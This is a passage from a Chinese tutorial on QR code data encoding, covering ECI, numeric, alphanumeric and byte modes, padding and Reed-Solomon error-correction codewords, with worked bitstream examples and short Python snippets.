\u6a21\u5f0f\u5373\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u6620\u5c04\u6765\u628a\u5b57\u7b26\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41 \u800c\u4e14\u90fd\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\u6765\u8868\u793a\u6570\u636e\uff08\u5373\u5728 ECI \u5934\u540e\u7684\u6a21\u5f0f\u6807\u8bc6\u7b26\u4e3a\u5b57\u8282\u6a21\u5f0f\u7684 0100\uff09 \u6bcf\u4e2a ECI \u90fd\u6709\u4e00\u4e2a\u516d\u4f4d\u6570\u7f16\u53f7\uff08assignment value\uff09\uff0c\u53ef\u80fd\u5360 1\u30012\u30013 \u4e2a codewords\uff0c\u5177\u4f53\u6807\u8bc6\u65b9\u5f0f\u89c1\u4e0b\u8868\uff08\u53601\u4e2a codewords \u65f6\u5f00\u5934\u4e00\u5b9a\u662f0\uff0c\u53602\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f10\uff0c\u53603\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f110\uff09\u8868\u4e2d xxxxxxxx \u8868\u793a\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236 ECI Assignment Value Codewords values 000000 \uff5e 000127 0xxxxxxx 000000 \uff5e 016383 10xxxxxx xxxxxxxx 000000 \uff5e 999999 110xxxxx xxxxxxxx xxxxxxxx \u800c\u4e14 ECI \u6a21\u5f0f\u4e0b\u4e2d\u9014\u53ef\u4ee5\u66f4\u6362 ECI \u6307\u793a\u5668\uff0c\u4e00\u4e2a 5C\uff0801011100\uff09\u8868\u793a\u6362\u65b0\u7684 ECI\uff0c\u540e\u9762\u8981\u63a56\u4e2a codewords \u53736\u4e2a\u6570\u5b57\uff08\u5341\u516d\u8fdb\u523630\uff5e39\uff09\u8868\u793a\u7f16\u53f7\uff0c\u800c\u4e0d\u662f\u7528\u4e0a\u8868\u4e2d\u7684\u8868\u793a\u65b9\u6cd5\u3002\u800c 5C \u6b63\u5e38\u60c5\u51b5\u4e0b\u8868\u793a \uff0c\u6240\u4ee5\u8868\u793a \u8fd9\u4e2a\u539f\u6570\u636e\u9700\u8981\u7528\u4e24\u4e2a 5C \u4f8b\u5b50 1 \u4f7f\u7528 ISO/IEC 8859-7\uff08ECI 000009\uff09\u6765\u8868\u793a\u5e0c\u814a\u5b57\u6bcd\u0391\u0392\u0393\u0394\u0395\uff08\u8be5 ECI \u4e0b\u8868\u793a\u4e3a\u5341\u516d\u8fdb\u5236 A1 A2 A3 A4 A5\uff09 \u6bd4\u7279\u6d41\uff1a ECI \u6807\u8bc6\u7b26\uff1a 0111 ECI \u7f16\u53f7\uff1a 00001001 \u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0100 \u5b57\u7b26\u6570\u91cf\uff1a 00000101 \uff085\u4e2a\u5b57\u7b26\uff09 \u6570\u636e\uff1a 10100001 10100010 10100011 10100100 10100101 \u6240\u4ee5\u6700\u7ec8\u7684\u6bd4\u7279\u6d41\uff1a 0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101 \u4f8b\u5b50 2\uff0814.3\uff09 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC\\123456 \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 5C 31 32 33 34 35 36 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC<\u540e\u63a5 ECI 123456 \u4e0b\u7684\u6570\u636e\u2026\u2026> \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 31 32 33 34 35 36 \u2026\u2026 \u6570\u5b57\u6a21\u5f0f\uff087.4.3\uff09 \u00b6 \u8f93\u5165\u7684\u6570\u5b57\u5b57\u7b26\u4e32\uff08\u56e0\u4e3a\u5f00\u5934\u53ef\u4ee5\u662f0\uff09\u8981\u88ab\u5206\u62103\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4f1a\u8f6c\u6362\u4e3a 10 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08999 -> 1111100111 \uff09\u3002\u5269\u4f59\u4e0d\u52303\u4e2a\u7684\u90e8\u5206\uff0c\u5982\u679c\u52692\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 7 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff0899 -> 1100011 \uff09\u5982\u679c\u52691\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 4 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff089 -> 1001 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0001 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u5b57\u7b26\u4e2a\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u5f00\u5934\u88650\u81f3\u957f\u5ea6\uff0c\u957f\u5ea6\u7531\u7248\u672c\u51b3\u5b9a\uff0c\u89c1\u4e0a 7.4.1 \u90e8\u5206\u7684\u7b2c\u4e8c\u4e2a\u8868\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1a 01234567 \uff08\u4fdd\u7559\u5f00\u59340\uff09 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000001000 \uff088\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u4e3a 10 bits\uff09 \u6570\u636e\uff1a 012 -> 0000001100 345 -> 0101011001 67 -> 1000011 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000001000 0000001100 0101011001 1000011 \u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[ B=M+C+10\\times\\lfloor\\frac{D}{3}\\rfloor+R \\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff08\u7248\u672c1\uff5e9\u4e3a 10\uff0c\u7248\u672c10\uff5e26\u4e3a 12\uff0c\u7248\u672c27\uff5e40\u4e3a 14\uff09\uff0cD\u4e3a\u8f93\u5165\u5b57\u7b26\u4e2a\u6570\uff0cR\u4e3a\u5269\u4f59\u90e8\u5206\uff08\u82e5 D mod 3 = 0 \u5219\u4e3a 0\uff0c\u82e5 D mod 3 = 1 \u5219\u4e3a 4\uff0c\u82e5 D mod 3 = 2 \u5219\u4e3a 7\uff09 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff087.4.4\uff09 \u00b6 \u6570\u5b57\u5b57\u6bcd\u6a21\u5f0f\uff08Alphanumeric mode\uff09\u4e0b\u652f\u6301\u7684\u7f16\u7801\u5b57\u7b26\u670945\u4e2a\uff0c\u628a\u5b83\u4eec\u4ece0\u7f16\u53f7\u81f344\u3002\u5176\u4e2d 0-9 \u5bf9\u5e94\u6570\u5b57 0-9\uff0c10-35 \u5bf9\u5e94\u5b57\u6bcd A-Z\uff0c36-44 \u5bf9\u5e949\u4e2a\u7b26\u53f7\uff1a \u8f93\u5165\u7684\u5b57\u7b26\u5148\u6309\u7167\u4e0a\u8868\u8f6c\u6362\u4e3a\u6570\u503c\uff0c\u7136\u540e\u5206\u4e3a\u4e24\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u4e00\u7ec4\u5185\u628a \u7b2c\u4e00\u4e2a\u6570\u503c \u00d7 45 + \u7b2c\u4e8c\u4e2a\u6570\u503c\uff0c\u518d\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 11 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 44\u00d745+44=2024 -> 11111101000 \uff09\u3002\u5982\u679c\u5b57\u7b26\u957f\u5ea6\u4e3a\u5947\u6570\uff0c\u5219\u4f1a\u5269\u4f59\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u5c06\u5176\u503c\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 6 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 11 -> 101100 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0010 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1aAC-42 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0010 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 000000101 \uff085\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u957f\u5ea6\u4e3a9\uff09 \u6570\u636e\uff1aAC-42 -> 10 12 41 4 2 -> (10 12)(41 4)(2) 10 12 -> 10*45+12=462 -> 00111001110 41 4 -> 41*45+4=1849 -> 11100111001 2 -> 2 -> 000010 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0010 000000101 00111001110 11100111001 000010 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[B=M+C+11\\times\\lfloor\\frac{D}{2}\\rfloor+6\\times(D\\bmod 2)\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6 \u5b57\u8282\u6a21\u5f0f\uff087.4.5\uff09 \u00b6 \u5b57\u8282\u6a21\u5f0f\uff08Byte mode\uff09\u4e0b\u628a\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e Latin-1\uff08ISO/IEC 8859-1\uff09\u7f16\u7801\u6210 8 bits\uff081\u5b57\u8282\uff09\uff0c\u76f4\u63a5\u63a5\u5728\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26 0100 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09\u7684\u540e\u9762\u3002 Latin-1 \u5b57\u8282\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\uff1a \\[B=M+C+8\\times D\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6 \u4e2d\u6587\u7f16\u7801 \u00b6 \u4e2d\u6587\u5728\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\u7684\u65f6\u5019\u4e5f\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\uff0c\u9700\u8981\u7528 UTF-8 \u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4f1a\u88ab\u7f16\u7801\u6210 3 \u4e2a\u5b57\u8282 \u6df7\u5408\u6a21\u5f0f\uff087.4.7\uff09 \u00b6 \u4e00\u4e2a\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u6d41\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6a21\u5f0f\uff0c\u4e14\u4e0d\u9700\u8981\u7279\u522b\u8868\u793a\u3002\u66f4\u6362\u65b0\u7684\u6a21\u5f0f\u65f6\u53ea\u9700\u8981\u6b63\u5e38\u6dfb\u52a0 \u6a21\u5f0f\u6807\u8bc6\u7b26+\u6570\u91cf\u6807\u8bc6\u7b26+\u6570\u636e \u5373\u53ef \u4f8b\u5b50 \u539f\u59cb\u6570\u636e\uff1a123\u6d4b\u8bd5 \u6570\u636e\u6d41\uff1a \u6570\u5b57\u6a21\u5f0f\uff1a \u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000000011 \uff083\uff0c\u957f\u5ea610\uff09 \u6570\u636e\uff1a123 -> 0001111011 \u5b57\u8282\u6a21\u5f0f\uff1a\u6d4b\u8bd5 -> E6 B5 8B / E8 AF 95 \u6807\u8bc6\u7b26\uff1a 0100 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 00000110 \uff086\uff0c\u957f\u5ea68\uff09 \u6570\u636e\uff1a \u6d4b -> 11100110 10110101 10001011 \u8bd5 -> 11101000 10101111 10010101 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101 \u7ed3\u675f\u7b26\uff087.4.9\uff09 \u00b6 \u5728\u6570\u636e\u7684\u672b\u5c3e\u8981\u586b\u51454\u4e2a0\u4f5c\u4e3a\u7ed3\u675f\u7b26\uff0c\u5982\u679c\u5bb9\u91cf\u4e0d\u8db3\u7684\u8bdd\u53ef\u4ee5\u7f29\u77ed\u6216\u7701\u7565 \u5373\u80fd\u586b\u4e0b\u5219\u52a04\u4e2a0\uff0c\u586b\u4e0d\u4e0b\u5219\u80fd\u52a0\u51e0\u4e2a0\u5c31\u52a0\u51e0\u4e2a0 \u586b\u5145 padding bits\uff087.4.10\uff09 \u00b6 \u8f6c\u6362\u540e\u7684\u6570\u636e\u6bd4\u7279\u6d41\u8fd8\u9700\u8981\u586b\u5145\u81f3\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u5bb9\u91cf \u9996\u5148\u5148\u7528 0 \u8865\u5145\u6bd4\u7279\u6d41\u957f\u5ea6\u5230 8 \u7684\u6574\u6570\u500d \u7136\u540e\u7528 11101100 \u548c 00010001 \u4ea4\u66ff\u586b\u8865\u5230\u4e8c\u7ef4\u7801\u6570\u636e\u5bb9\u91cf \u5177\u4f53\u7684\u6570\u636e\u5bb9\u91cf\u7531\u7248\u672c\u53f7\u548c\u7ea0\u9519\u7b49\u7ea7\u51b3\u5b9a\uff0c\u4e14\u6570\u636e\u5bb9\u91cf\uff08\u6bd4\u7279\uff09\u4e00\u5b9a\u4e3a8\u7684\u500d\u6570\uff0c\u5b8c\u6574\u6570\u636e\u89c1\u6587\u6863\u7684 33\uff5e36 \u9875\uff08\u6574\u4e2a pdf \u7684\u7b2c 41\uff5e44 \u9875\uff09 \u6ce8 \u8fd9\u4e2a\u5730\u65b9 QRazyBox \u7f51\u7ad9\u5b58\u5728 bug\uff0c\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u8bc6\u522b\u586b\u5145\u7684 0 \u6bd4\u7279\u548c padding bits\uff08\u5373\u53ef\u80fd\u628a\u586b\u5145\u7684 0 \u4e2d\u524d\u56db\u4e2a\u89c6\u4e3a\u4e00\u4e2a terminator\uff0c\u628a\u540e\u9762\u7684 0 \u624d\u89c6\u4e3a\u5c5e\u4e8e padding bits \uff09 \u7ea0\u9519\u7801\u7f16\u7801\uff087.5\uff09 \u00b6 \u7ea0\u9519\u5bb9\u91cf\uff087.5.1\uff09 \u00b6 \u7ea0\u9519\u5b57\uff08error correction codewords\uff09\u53ef\u4ee5\u7ea0\u6b63\u4e24\u79cd\u9519\u8bef\uff0c\u4e00\u79cd\u662f\u6bd4\u5982\u65e0\u6cd5\u626b\u63cf\u6216\u65e0\u6cd5\u89e3\u7801\u7684\u5df2\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08erasures\uff09\uff0c\u4e00\u79cd\u662f\u672a\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08errors\uff09\uff0c\u4e00\u4e2a erasures \u53ef\u4ee5\u7531\u4e00\u4e2a\u7ea0\u9519\u5b57\u7ea0\u9519\uff0c\u800c\u4e00\u4e2a errors \u9700\u8981\u4e24\u4e2a\u7ea0\u9519\u5b57\u6765\u7ea0\u9519 \u53ef\u4ee5\u7ea0\u9519\u7684 erasures \u548c errors \u7684\u6570\u91cf\u6ee1\u8db3\uff1a \\[e+2t\\leq d-p\\] \u5176\u4e2d \\(e\\) \u662f erasures \u7684\u6570\u91cf\uff0c \\(t\\) \u662f errors \u7684\u6570\u91cf\uff0c \\(d\\) \u662f\u7ea0\u9519\u5b57\u7684\u6570\u91cf\uff0c \\(p\\) \u662f\u88ab\u9519\u8bef\u89e3\u6790\u7684\u4fdd\u62a4\u5b57\u6570\u91cf \u5176\u4e2d \\(p\\) \u7531\u7248\u672c\u51b3\u5b9a\uff1a \\(p=3\\) \uff1a\u7248\u672c 1-L \\(p=2\\) \uff1a\u7248\u672c 1-M\u30012-L \\(p=1\\) \uff1a\u7248\u672c 1-Q\u30011-H\u30013-L \\(p=0\\) \uff1a\u5176\u4ed6\u6240\u6709\u7248\u672c \u5206\u5757\u7f16\u7801\u7ea0\u9519\u7801 \u00b6 \u6839\u636e\u7248\u672c\u53f7\u53ca\u7ea0\u9519\u7b49\u7ea7\uff0c\u6570\u636e\u5e8f\u5217\u9700\u8981\u88ab\u5206\u6210 1 \u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u6bcf\u5757\u5185\u9700\u8981\u5355\u72ec\u7f16\u7801\u7ea0\u9519\u7801 \u5982\u679c\u9700\u8981\u8865\u5145\u7684\u8bdd\u4e00\u5f8b\u5168\u90e8\u8865\u5145 0 \u6bd4\u7279\u5230\u9700\u8981\u7684\u957f\u5ea6 \u5177\u4f53\u4e0d\u540c\u7248\u672c\u7684\u5206\u5757\u5757\u6570\u548c\u6bcf\u5757\u4e2d\u6570\u91cf\u5b89\u6392\u4ee5\u53ca\u7ea0\u9519\u5bb9\u91cf\u90fd\u5728\u6587\u6863\u4e2d P38-44\uff08pdf \u4e2d P46-52\uff09\u7684\u5927\u8868\u683c Table 9 \u4e2d \u751f\u6210\u7ea0\u9519\u7801\uff087.5.2\uff09 \u00b6 \u4f3d\u7f57\u74e6\u57df \u00b6 \u751f\u6210\u7ea0\u9519\u7801\u4e4b\u524d\u8981\u5148\u5c06\u6240\u6709\u6570\u636e\u5b57\u8f6c\u6362\u6210\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u4f7f\u5176\u9650\u5236\u4e8e\u4f3d\u7f57\u74e6\u57df \\(GF(2^3)\\bmod 100011101\\) \u4e2d\uff0c\u800c\u4e14\u540e\u7eed\u7684\u56db\u5219\u8fd0\u7b97\u4e5f\u90fd\u662f\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u8fd0\u7b97 \u5177\u4f53\u4f3d\u7f57\u74e6\u57df\u7684\u751f\u6210\u539f\u7406\u53ef\u4ee5\u770b\uff1a https://www.codenong.com/cs105738710/ \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u52a0\u51cf\u6cd5\u90fd\u662f\u5f02\u6216\uff0c\u4e58\u9664\u6cd5\u8981\u6bcf\u4e00\u4e2a\u6bd4\u7279\u6a21 2\uff0c\u6bcf\u4e00\u4e2a\u5b57\u8282\u6a21 100011101\uff08\u5373\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u672c\u539f\u591a\u9879\u5f0f \\(x^8+x^4+x^3+x^2+1\\) \uff09 \u5177\u4f53\u591a\u9879\u5f0f mod \u8fd0\u7b97\u7684\u65b9\u6cd5\u53ef\u4ee5\u770b\uff1a https://blog.csdn.net/yaongtime/article/details/17200401 \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u957f\u9664\u6cd5\u53d6\u6a21\uff0c\u800c\u4e14\u6ce8\u610f\u8fd9\u91cc\u7684\u52a0\u51cf\u90fd\u662f\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u52a0\u51cf\uff0c\u5373\u5f02\u6216 \u751f\u6210\u591a\u9879\u5f0f\uff08Annex A\uff09 \u00b6 \u7ea0\u9519\u7801\u751f\u6210\u591a\u9879\u5f0f\u7684\u4e00\u822c\u8868\u8fbe\u5f62\u5f0f\u662f\uff1a \\[g(x)=(x-\\alpha^0)(x-\\alpha^1)\\cdots(x-\\alpha^{n-1})\\] \u5176\u4e2d \\(n\\) \u4e3a\u7ea0\u9519\u7801\u5b57\u7684\u4e2a\u6570\uff0c\u5176\u4e2d \\(\\alpha=2\\) \uff0c \\(\\alpha^k\\) \u7684\u662f\u5728\u4f3d\u7f57\u74e6\u57df\u4e0b\u7684\u8fd0\u7b97\uff0c\u5373\uff1a \\(\\alpha^0 = 1;\\ \\alpha^1=2;\\ \\alpha^2=4;\\ \\cdots;\\ \\alpha^7=128\\) \\(\\alpha^8=256\\bmod 285=256\\oplus 285=29;\\ \\alpha^9=29\\times2=58;\\ \\cdots\\) \u5177\u4f53\u8ba1\u7b97 \\(\\alpha^k\\) \u7684\u4ee3\u7801\uff1a def alpha ( k ): res = 1 for _ in range ( k ): res *= 2 if res >= 256 : res ^= 285 return res \u6587\u6863\u9644\u5f55 A \u4e2d\u5df2\u7ecf\u5c55\u5f00\u4e86\u6240\u6709\u53ef\u80fd \\(n\\) \u503c\u4e0b\u768436\u4e2a\u751f\u6210\u591a\u9879\u5f0f \u751f\u6210\u7ea0\u9519\u7801 \u00b6 \u6587\u6863\u91cc\u7ed9\u4e86\u4e00\u4e2a\u611f\u89c9\u6bd4\u8f83\u6666\u6da9\u96be\u61c2\u7684\u56fe\u6765\u5c55\u793a\u751f\u6210\u7ea0\u9519\u7801\u7684\u8fc7\u7a0b\uff1a \u4e0d\u662f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u4e8e\u662f\u627e\u4e86\u53e6\u4e00\u7bc7\u6587\u7ae0\uff1a https://blog.csdn.net/ljm1995/article/details/88819664 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6bd4\u5982\u8981\u7f16\u7801 12345678 \u8fd9\u516b\u4e2a\u6570\u5b57 \u7248\u672c 1-L\uff0c\u67e5 Table 9 \u5f97\u5230\u5206\u4e3a 1 \u5757\uff0c\u4e14\u8be5\u5757\u5185\u603b\u5b57\u6570\u4e3a 26\uff0c\u6570\u636e\u5b57\u6570\u4e3a 19\uff0c\u7ea0\u9519\u5b57\u6570\u4e3a 26-19=7 \u6839\u636e\u524d\u9762\u6240\u8bf4\uff0c\u6bd4\u7279\u6d41\u5e94\u8be5\u662f\uff1a 0001 0000001000 0001111011 0111001000 1001110 0000 \u8865\u6210 8 \u7684\u500d\u6570\u957f\u5ea6\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 \u6dfb\u52a0 padding bits\uff08\u8865\u5230 19 \u4e2a\u5b57\u8282\uff09\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 \u5199\u6210\u591a\u9879\u5f0f\u5f62\u5f0f\uff0c\u6b21\u6570\u662f 19 \u6b21\uff0c\u6574\u4f53\u4e58 \\(x^7\\) \uff1a \\[16x^{25}+32x^{24}+123x^{23}+114x^{22}+39x^{21}+236x^{19}+\\\\\\\\17x^{18}+236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u518d\u67e5\u9644\u5f55 A \u5f97\u5230\u6b21\u6570\u4e3a 7 \u7684\u751f\u6210\u591a\u9879\u5f0f\uff0c\u5e76\u6574\u4f53\u4e58 \\(x^{18}\\) \uff1a \\[x^{25}+\\alpha^{87}x^{24}+\\alpha^{229}x^{23}+\\alpha^{146}x^{22}+\\alpha^{149}x^{21}+\\\\\\\\\\alpha^{238}x^{20}+\\alpha^{102}x^{19}+\\alpha^{21}x^{18}\\] \u7136\u540e\u628a\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u9664\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u53d6\u4f59\u6570 \u53ef\u4ee5\u8fd9\u6837\u8ba1\u7b97\uff0c\u628a\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u6574\u4f53\u4e58 16 \u5373 \\(\\alpha^4\\) \uff1a \\[\\alpha^4x^{25}+\\alpha^{91}x^{24}+\\alpha^{233}x^{23}+\\alpha^{150}x^{22}+\\alpha^{153}x^{21}+\\\\\\\\\\alpha^{242}x^{20}+\\alpha^{106}x^{19}+\\alpha^{25}x^{18}\\] \u8ba1\u7b97\u51fa\u7cfb\u6570\u7684\u503c\uff1a \\[16x^{25}+163x^{24}+243x^{23}+85x^{22}+146x^{21}+\\\\\\\\176x^{20}+52x^{19}+3x^{18}\\] \u4e4b\u540e\u4e0e\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u5f02\u6216\u5f97\u5230\uff1a \\[131x^{24}+136x^{23}+197x^{22}+181x^{21}+216x^{19}+18x^{18}+\\\\\\\\236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u8fd9\u4e4b\u540e\u6700\u9ad8\u6b21\u5c31\u53d8\u6210\u4e86 24 \u6b21\uff0c\u91cd\u590d\u6574\u4e2a\u8fc7\u7a0b\u76f4\u5230\u7ed3\u679c\u53ea\u5269\u4e0b 7 \u9879\uff08\u5373\u6700\u9ad8\u6b21\u4e3a 6 \u6b21\uff09\u65f6\u5373\u53ef\u5f97\u5230\uff1a \\[188x^6+247x^5+62x^4+248x^3+53x^2+170x+224\\] \u6240\u4ee5\u7ea0\u9519\u7801\u5c31\u662f\uff1a 188 247 62 248 53 170 224 \u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff1a 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u6240\u4ee5\u6574\u4e2a\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u533a\u57df\uff08\u9664\u683c\u5f0f\u4fe1\u606f\u5916\uff09\u5168\u90e8\u5185\u5bb9\u5c31\u662f\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u7ea0\u9519\u7801\u53ef\u4ee5\u76f4\u63a5\u7528 python \u7684 reedsolo \u5305\u6765\u6c42\u89e3\uff1a >>> from reedsolo import RSCodec , ReedSolomonError >>> rsc = RSCodec ( 7 ) >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ])) [ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 188 , 247 , 62 , 248 , 53 , 170 , 224 ] >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ]))[ - 7 :] [ 188 , 247 , 62 , 248 , 53 , 170 , 224 ] \u5269\u4f59\u6b65\u9aa4\uff087.6~7.10\uff09 \u00b6 \u5408\u6210\u5e8f\u5217\uff087.6\uff09 \u00b6 \u9996\u5148\u6309\u7167 2 \u4e2d\u6240\u8ff0\u7ed9\u5b8c\u6574\u4fe1\u606f\u7f16\u7801\u6210\u6570\u636e\u5e8f\u5217\uff0c\u5176\u4e2d\u4e5f\u5305\u542b padding bits\uff0c\u4e14\u957f\u5ea6\u4e3a 8 \u7684\u500d\u6570 \u7136\u540e\u6839\u636e 3.1.1 \u4e2d\u6240\u8bf4\u5bf9\u6570\u636e\u5e8f\u5217\u8fdb\u884c\u5206\u5757\uff0c\u7136\u540e\u5bf9\u6bcf\u5757\u5206\u522b\u751f\u6210\u7ea0\u9519\u7801 \u6700\u540e\u628a\u6570\u636e\u5e8f\u5217\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4f9d\u6b21\u4ea4\u9519\u5408\u6210\u65b0\u7684\u6570\u636e\u5e8f\u5217\uff0c\u7136\u540e\u628a\u7ea0\u9519\u7801\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4ea4\u9519\u5408\u6210\u7ea0\u9519\u7801\u5e8f\u5217\u3002\u628a\u65b0\u7684\u6570\u636e\u5e8f\u5217\u548c\u7ea0\u9519\u7801\u5e8f\u5217\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5982\u679c\u603b\u957f\u5ea6\u4e0d\u591f\u4e8c\u7ef4\u7801\u7684\u5bb9\u91cf\uff0c\u5219\u5728\u540e\u9762\u8865\u5145 3/4/7 \u4e2a 0 \u6bd4\u7279\uff08\u9700\u8981\u8865\u591a\u5c11\u5728 Table 1 \u4e2d\u6709\u5b9a\u4e49\uff09 \u800c\u4e14\u8fd9\u6837\u4e5f\u8981\u4fdd\u8bc1\u6700\u77ed\u7684\u6570\u636e\u5757\u5728\u6700\u524d\u9762\uff08\u5df2\u7ecf\u7531 Table 9 \u5b9a\u4e49\uff09 \u6bd4\u5982 5-H \u7248\u672c\u7684\u5e8f\u5217\uff0c\u9700\u8981\u5206\u4e3a 4 